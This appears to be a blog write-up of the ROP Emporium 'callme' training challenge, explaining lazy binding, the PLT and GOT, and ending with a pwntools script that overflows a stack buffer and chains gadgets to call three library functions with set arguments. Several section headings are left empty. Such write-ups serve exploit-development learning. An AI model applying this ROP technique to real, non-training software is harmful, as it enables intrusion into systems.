<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<!-- 2021-08-06 Fri 12:21 -->
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>ROPemporium | callme</title>
<meta name="generator" content="Org mode" />
<style type="text/css">
 <!--/*--><![CDATA[/*><!--*/
  .title  { text-align: center;
             margin-bottom: .2em; }
  .subtitle { text-align: center;
              font-size: medium;
              font-weight: bold;
              margin-top:0; }
  .todo   { font-family: monospace; color: red; }
  .done   { font-family: monospace; color: green; }
  .priority { font-family: monospace; color: orange; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #ccc;
    box-shadow: 3px 3px 3px #eee;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: auto;
    padding-top: 1.2em;
  }
  pre.src:before {
    display: none;
    position: absolute;
    background-color: white;
    top: -10px;
    right: 10px;
    padding: 3px;
    border: 1px solid black;
  }
  pre.src:hover:before { display: inline; margin-top: 14px;}
  /* Languages per Org manual */
  pre.src-asymptote:before { content: 'Asymptote'; }
  pre.src-awk:before { content: 'Awk'; }
  pre.src-C:before { content: 'C'; }
  /* pre.src-C++ doesn't work in CSS */
  pre.src-clojure:before { content: 'Clojure'; }
  pre.src-css:before { content: 'CSS'; }
  pre.src-D:before { content: 'D'; }
  pre.src-ditaa:before { content: 'ditaa'; }
  pre.src-dot:before { content: 'Graphviz'; }
  pre.src-calc:before { content: 'Emacs Calc'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-fortran:before { content: 'Fortran'; }
  pre.src-gnuplot:before { content: 'gnuplot'; }
  pre.src-haskell:before { content: 'Haskell'; }
  pre.src-hledger:before { content: 'hledger'; }
  pre.src-java:before { content: 'Java'; }
  pre.src-js:before { content: 'Javascript'; }
  pre.src-latex:before { content: 'LaTeX'; }
  pre.src-ledger:before { content: 'Ledger'; }
  pre.src-lisp:before { content: 'Lisp'; }
  pre.src-lilypond:before { content: 'Lilypond'; }
  pre.src-lua:before { content: 'Lua'; }
  pre.src-matlab:before { content: 'MATLAB'; }
  pre.src-mscgen:before { content: 'Mscgen'; }
  pre.src-ocaml:before { content: 'Objective Caml'; }
  pre.src-octave:before { content: 'Octave'; }
  pre.src-org:before { content: 'Org mode'; }
  pre.src-oz:before { content: 'OZ'; }
  pre.src-plantuml:before { content: 'Plantuml'; }
  pre.src-processing:before { content: 'Processing.js'; }
  pre.src-python:before { content: 'Python'; }
  pre.src-R:before { content: 'R'; }
  pre.src-ruby:before { content: 'Ruby'; }
  pre.src-sass:before { content: 'Sass'; }
  pre.src-scheme:before { content: 'Scheme'; }
  pre.src-screen:before { content: 'Gnu Screen'; }
  pre.src-sed:before { content: 'Sed'; }
  pre.src-sh:before { content: 'shell'; }
  pre.src-sql:before { content: 'SQL'; }
  pre.src-sqlite:before { content: 'SQLite'; }
  /* additional languages in org.el's org-babel-load-languages alist */
  pre.src-forth:before { content: 'Forth'; }
  pre.src-io:before { content: 'IO'; }
  pre.src-J:before { content: 'J'; }
  pre.src-makefile:before { content: 'Makefile'; }
  pre.src-maxima:before { content: 'Maxima'; }
  pre.src-perl:before { content: 'Perl'; }
  pre.src-picolisp:before { content: 'Pico Lisp'; }
  pre.src-scala:before { content: 'Scala'; }
  pre.src-shell:before { content: 'Shell Script'; }
  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
  /* additional language identifiers per "defun org-babel-execute"
       in ob-*.el */
  pre.src-cpp:before  { content: 'C++'; }
  pre.src-abc:before  { content: 'ABC'; }
  pre.src-coq:before  { content: 'Coq'; }
  pre.src-groovy:before  { content: 'Groovy'; }
  /* additional language identifiers from org-babel-shell-names in
     ob-shell.el: ob-shell is the only babel language using a lambda to put
     the execution function name together. */
  pre.src-bash:before  { content: 'bash'; }
  pre.src-csh:before  { content: 'csh'; }
  pre.src-ash:before  { content: 'ash'; }
  pre.src-dash:before  { content: 'dash'; }
  pre.src-ksh:before  { content: 'ksh'; }
  pre.src-mksh:before  { content: 'mksh'; }
  pre.src-posh:before  { content: 'posh'; }
  /* Additional Emacs modes also supported by the LaTeX listings package */
  pre.src-ada:before { content: 'Ada'; }
  pre.src-asm:before { content: 'Assembler'; }
  pre.src-caml:before { content: 'Caml'; }
  pre.src-delphi:before { content: 'Delphi'; }
  pre.src-html:before { content: 'HTML'; }
  pre.src-idl:before { content: 'IDL'; }
  pre.src-mercury:before { content: 'Mercury'; }
  pre.src-metapost:before { content: 'MetaPost'; }
  pre.src-modula-2:before { content: 'Modula-2'; }
  pre.src-pascal:before { content: 'Pascal'; }
  pre.src-ps:before { content: 'PostScript'; }
  pre.src-prolog:before { content: 'Prolog'; }
  pre.src-simula:before { content: 'Simula'; }
  pre.src-tcl:before { content: 'tcl'; }
  pre.src-tex:before { content: 'TeX'; }
  pre.src-plain-tex:before { content: 'Plain TeX'; }
  pre.src-verilog:before { content: 'Verilog'; }
  pre.src-vhdl:before { content: 'VHDL'; }
  pre.src-xml:before { content: 'XML'; }
  pre.src-nxml:before { content: 'XML'; }
  /* add a generic configuration mode; LaTeX export needs an additional
     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
  pre.src-conf:before { content: 'Configuration File'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.org-right  { text-align: center;  }
  th.org-left   { text-align: center;   }
  th.org-center { text-align: center; }
  td.org-right  { text-align: right;  }
  td.org-left   { text-align: left;   }
  td.org-center { text-align: center; }
  dt { font-weight: bold; }
  .footpara { display: inline; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .equation-container {
    display: table;
    text-align: center;
    width: 100%;
  }
  .equation {
    vertical-align: middle;
  }
  .equation-label {
    display: table-cell;
    text-align: right;
    vertical-align: middle;
  }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  .org-svg { width: 90%; }
  /*]]>*/-->
</style>
<script type="text/javascript">
// @license magnet:?xt=urn:btih:1f739d935676111cfff4b4693e3816e664797050&amp;dn=gpl-3.0.txt GPL-v3-or-Later
<!--/*--><![CDATA[/*><!--*/
     function CodeHighlightOn(elem, id)
     {
       var target = document.getElementById(id);
       if(null != target) {
         elem.classList.add("code-highlighted");
         target.classList.add("code-highlighted");
       }
     }
     function CodeHighlightOff(elem, id)
     {
       var target = document.getElementById(id);
       if(null != target) {
         elem.classList.remove("code-highlighted");
         target.classList.remove("code-highlighted");
       }
     }
    /*]]>*///-->
// @license-end
</script>
</head>
<body>
<div id="preamble" class="status">
<div class="header">
    <a href="index.html">Home</a>
    <a href="https://github.com/c3lphie">Github</a>
</div>
</div>
<div id="content">
<h1 class="title">ROPemporium | callme</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#org3065872">1. Introduction</a>
<ul>
<li><a href="#orgf0b280d">1.1. Lazy Binding</a>
<ul>
<li><a href="#org0027a3e">1.1.1. The PLT</a></li>
<li><a href="#org96431c0">1.1.2. The GOT</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#org53c7479">2. Recon</a>
<ul>
<li><a href="#org249b97e">2.1. File</a></li>
<li><a href="#org77dfbf6">2.2. Checksec</a></li>
<li><a href="#org69e1dac">2.3. Static analysis</a></li>
</ul>
</li>
<li><a href="#orge33635c">3. Exploitation</a>
<ul>
<li><a href="#org316aedc">3.1. Buffer overflow</a></li>
<li><a href="#org08017d8">3.2. Finding gadgets</a></li>
<li><a href="#orgff6cf75">3.3. Creating the chain</a></li>
<li><a href="#org2e6b3cf">3.4. Final exploit</a></li>
</ul>
</li>
</ul>
</div>
</div>
<div id="outline-container-org3065872" class="outline-2">
<h2 id="org3065872"><span class="section-number-2">1.</span> Introduction</h2>
<div class="outline-text-2" id="text-1">
<p>
Welcome to the third installment in this ROPventure? idk&#x2026; It sounded cooler in my head.
</p>

<p>
Anyway this time we are doing the third challenge from ROPemporium, <code>callme</code>.
This challenge introduces the Procedure Linkage Table, which is a section in ELF files used to enable dynamic linking.
</p>
</div>
<div id="outline-container-orgf0b280d" class="outline-3">
<h3 id="orgf0b280d"><span class="section-number-3">1.1.</span> Lazy Binding</h3>
<div class="outline-text-3" id="text-1-1">
<p>
Lazy binding is a technique used by the dynamic linker, so that functions aren't loaded before they are needed.
This is done to decrease program startup time.
If Lazy binding isn't used by the linker, all functions coming from libraries must be loaded at startup, before they are executed.
</p>
</div>
<div id="outline-container-org0027a3e" class="outline-4">
<h4 id="org0027a3e"><span class="section-number-4">1.1.1.</span> The PLT</h4>
<div class="outline-text-4" id="text-1-1-1">
<p>
The Procedure Linkage Table (PLT), is the section of an ELF file where function stubs are located.
</p>
<pre class="example" id="org8d3c118">
┌────[~/ha/bi/ropemporium/callme on  master [?]
└─&gt;objdump -d -j .plt callme

callme:     file format elf64-x86-64


Disassembly of section .plt:

00000000004006c0 &lt;.plt&gt;:
  4006c0:       ff 35 42 09 20 00       push   0x200942(%rip)  
  4006c6:       ff 25 44 09 20 00       jmp    *0x200944(%rip) 
  4006cc:       0f 1f 40 00             nopl   0x0(%rax)

00000000004006d0 &lt;puts@plt&gt;:
  4006d0:       ff 25 42 09 20 00       jmp    *0x200942(%rip) 
  4006d6:       68 00 00 00 00          push   $0x0
  4006db:       e9 e0 ff ff ff          jmp    4006c0 &lt;.plt&gt;

00000000004006e0 &lt;printf@plt&gt;:
  4006e0:       ff 25 3a 09 20 00       jmp    *0x20093a(%rip) 5&gt;
  4006e6:       68 01 00 00 00          push   $0x1
  4006eb:       e9 d0 ff ff ff          jmp    4006c0 &lt;.plt&gt;

.........

0000000000400740 &lt;callme_two@plt&gt;:
  400740:       ff 25 0a 09 20 00       jmp    *0x20090a(%rip) 
  400746:       68 07 00 00 00          push   $0x7
  40074b:       e9 70 ff ff ff          jmp    4006c0 &lt;.plt&gt;

0000000000400750 &lt;exit@plt&gt;:
  400750:       ff 25 02 09 20 00       jmp    *0x200902(%rip) 
  400756:       68 08 00 00 00          push   $0x8
  40075b:       e9 60 ff ff ff          jmp    4006c0 &lt;.plt&gt;
</pre>
<p>
The PLT is split into two sections, there is the head at addresses <code>0x4006c0-0x4006cc</code>.
Where the rest of the of the section are comprised of the function stubs, that will point to addresses in the GOT after it has been resolved by <code>_dl_runtime_resolve()</code>.<sup><a id="fnr.1" class="footref" href="#fn.1">1</a></sup>
</p>
</div>
</div>

<div id="outline-container-org96431c0" class="outline-4">
<h4 id="org96431c0"><span class="section-number-4">1.1.2.</span> The GOT</h4>
<div class="outline-text-4" id="text-1-1-2">
<p>
No this isn't "Game of Thrones", GOT is short for "Global Offset Table".
Which is a table that hold the memory addresses for functions.
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-org53c7479" class="outline-2">
<h2 id="org53c7479"><span class="section-number-2">2.</span> Recon</h2>
<div class="outline-text-2" id="text-2">
</div>
<div id="outline-container-org249b97e" class="outline-3">
<h3 id="org249b97e"><span class="section-number-3">2.1.</span> File</h3>
<div class="outline-text-3" id="text-2-1">
<pre class="example" id="orgac3f59c">
┌────[~/ha/bi/ropemporium/callme on  master [?] 
└─&gt;file callme 
callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped
</pre>
</div>
</div>
<div id="outline-container-org77dfbf6" class="outline-3">
<h3 id="org77dfbf6"><span class="section-number-3">2.2.</span> Checksec</h3>
<div class="outline-text-3" id="text-2-2">
<pre class="example" id="org02a2892">
┌────[~/ha/bi/ropemporium/callme on  master [?] 
└─&gt;checksec callme 
[*] '/home/c3lphie/hacking/binary_exploitation/ropemporium/callme/callme' 
    Arch:     amd64-64-little 
    RELRO:    Partial RELRO 
    Stack:    No canary found 
    NX:       NX enabled 
    PIE:      No PIE (0x400000) 
    RUNPATH:  b'.'
</pre>
</div>
</div>
<div id="outline-container-org69e1dac" class="outline-3">
<h3 id="org69e1dac"><span class="section-number-3">2.3.</span> Static analysis</h3>
</div>
</div>
<div id="outline-container-orge33635c" class="outline-2">
<h2 id="orge33635c"><span class="section-number-2">3.</span> Exploitation</h2>
<div class="outline-text-2" id="text-3">
</div>
<div id="outline-container-org316aedc" class="outline-3">
<h3 id="org316aedc"><span class="section-number-3">3.1.</span> Buffer overflow</h3>
</div>
<div id="outline-container-org08017d8" class="outline-3">
<h3 id="org08017d8"><span class="section-number-3">3.2.</span> Finding gadgets</h3>
</div>
<div id="outline-container-orgff6cf75" class="outline-3">
<h3 id="orgff6cf75"><span class="section-number-3">3.3.</span> Creating the chain</h3>
</div>
<div id="outline-container-org2e6b3cf" class="outline-3">
<h3 id="org2e6b3cf"><span class="section-number-3">3.4.</span> Final exploit</h3>
<div class="outline-text-3" id="text-3-4">
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b5bd68;">from</span> pwn <span style="color: #b5bd68;">import</span> *

<span style="color: #f0c674;">context.terminal</span> = <span style="color: #c5c8c6;">[</span><span style="color: #8abeb7;">"tmux"</span>, <span style="color: #8abeb7;">"new-window"</span><span style="color: #c5c8c6;">]</span>

<span style="color: #f0c674;">proc</span> = process<span style="color: #c5c8c6;">(</span><span style="color: #8abeb7;">"./callme"</span><span style="color: #c5c8c6;">)</span>
gdb.attach<span style="color: #c5c8c6;">(</span>
    proc,
    <span style="color: #8abeb7;">"""</span>
<span style="color: #8abeb7;">break main"""</span>,
<span style="color: #c5c8c6;">)</span>


<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">send_recv</span><span style="color: #c5c8c6;">(</span><span style="color: #b294bb;">buffer</span>: <span style="color: #b294bb;">bytes</span><span style="color: #c5c8c6;">)</span>:
    proc.recvuntil<span style="color: #c5c8c6;">(</span><span style="color: #8abeb7;">"&gt;"</span><span style="color: #c5c8c6;">)</span>
    proc.send<span style="color: #c5c8c6;">(</span><span style="color: #b294bb;">buffer</span><span style="color: #c5c8c6;">)</span>
    <span style="color: #b5bd68;">return</span> proc.recvline<span style="color: #c5c8c6;">()[</span>:-1<span style="color: #c5c8c6;">]</span>


<span style="color: #f0c674;">padding</span> = cyclic<span style="color: #c5c8c6;">(</span>cyclic_find<span style="color: #8abeb7;">(</span>0x61616169<span style="color: #8abeb7;">)</span><span style="color: #c5c8c6;">)</span>
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">padding = cyclic(300)</span>

<span style="color: #b5bd68;">print</span><span style="color: #c5c8c6;">(</span>padding<span style="color: #c5c8c6;">)</span>
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">plt addresses</span>
<span style="color: #f0c674;">puts_plt</span> = p64<span style="color: #c5c8c6;">(</span>0x4006D0<span style="color: #c5c8c6;">)</span>
<span style="color: #f0c674;">read_plt</span> = p64<span style="color: #c5c8c6;">(</span>0x400716<span style="color: #c5c8c6;">)</span>
<span style="color: #f0c674;">call_me_one</span> = p64<span style="color: #c5c8c6;">(</span>0x400726<span style="color: #c5c8c6;">)</span>
<span style="color: #f0c674;">call_me_two</span> = p64<span style="color: #c5c8c6;">(</span>0x400746<span style="color: #c5c8c6;">)</span>
<span style="color: #f0c674;">call_me_three</span> = p64<span style="color: #c5c8c6;">(</span>0x4006F6<span style="color: #c5c8c6;">)</span>

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">call_me arguments</span>
<span style="color: #f0c674;">arg1</span> = p64<span style="color: #c5c8c6;">(</span>0xDEADBEEFDEADBEEF<span style="color: #c5c8c6;">)</span>
<span style="color: #f0c674;">arg2</span> = p64<span style="color: #c5c8c6;">(</span>0xCAFEBABECAFEBABE<span style="color: #c5c8c6;">)</span>
<span style="color: #f0c674;">arg3</span> = p64<span style="color: #c5c8c6;">(</span>0xD00DF00DD00DF00D<span style="color: #c5c8c6;">)</span>

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Gadgets</span>
<span style="color: #f0c674;">pop_rdi</span> = p64<span style="color: #c5c8c6;">(</span>0x4009A3<span style="color: #c5c8c6;">)</span>
<span style="color: #f0c674;">pop_rsi_rdx</span> = p64<span style="color: #c5c8c6;">(</span>0x40093D<span style="color: #c5c8c6;">)</span>

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">ROP chain</span>
<span style="color: #f0c674;">payload</span> = padding
<span style="color: #f0c674;">payload</span> += p64<span style="color: #c5c8c6;">(</span>0xDEADBEEFCAFEBABE<span style="color: #c5c8c6;">)</span>  <span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">dummy data</span>
<span style="color: #f0c674;">payload</span> += pop_rdi
<span style="color: #f0c674;">payload</span> += arg1
<span style="color: #f0c674;">payload</span> += pop_rsi_rdx
<span style="color: #f0c674;">payload</span> += arg2
<span style="color: #f0c674;">payload</span> += arg3
<span style="color: #f0c674;">payload</span> += call_me_one
<span style="color: #f0c674;">payload</span> += pop_rdi
<span style="color: #f0c674;">payload</span> += arg1
<span style="color: #f0c674;">payload</span> += pop_rsi_rdx
<span style="color: #f0c674;">payload</span> += arg2
<span style="color: #f0c674;">payload</span> += arg3
<span style="color: #f0c674;">payload</span> += call_me_two
<span style="color: #f0c674;">payload</span> += pop_rdi
<span style="color: #f0c674;">payload</span> += arg1
<span style="color: #f0c674;">payload</span> += pop_rsi_rdx
<span style="color: #f0c674;">payload</span> += arg2
<span style="color: #f0c674;">payload</span> += arg3
<span style="color: #f0c674;">payload</span> += call_me_three


send_recv<span style="color: #c5c8c6;">(</span>payload<span style="color: #c5c8c6;">)</span>

proc.interactive<span style="color: #c5c8c6;">()</span>
</pre>
</div>
</div>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1">1</a></sup> <div class="footpara"><p class="footpara">
Read more about <code>_dl_runtime_resolve()</code> here <a href="https://ypl.coffee/dl-resolve/">https://ypl.coffee/dl-resolve/</a> 
</p></div></div>


</div>
</div></div>
<div id="postamble" class="status">
<div class="footer">
    <div id="copyright">
        <small>&copy; Copyright 2021, C3lphie</small>
    </div>
</div>
</div>
</body>
</html>
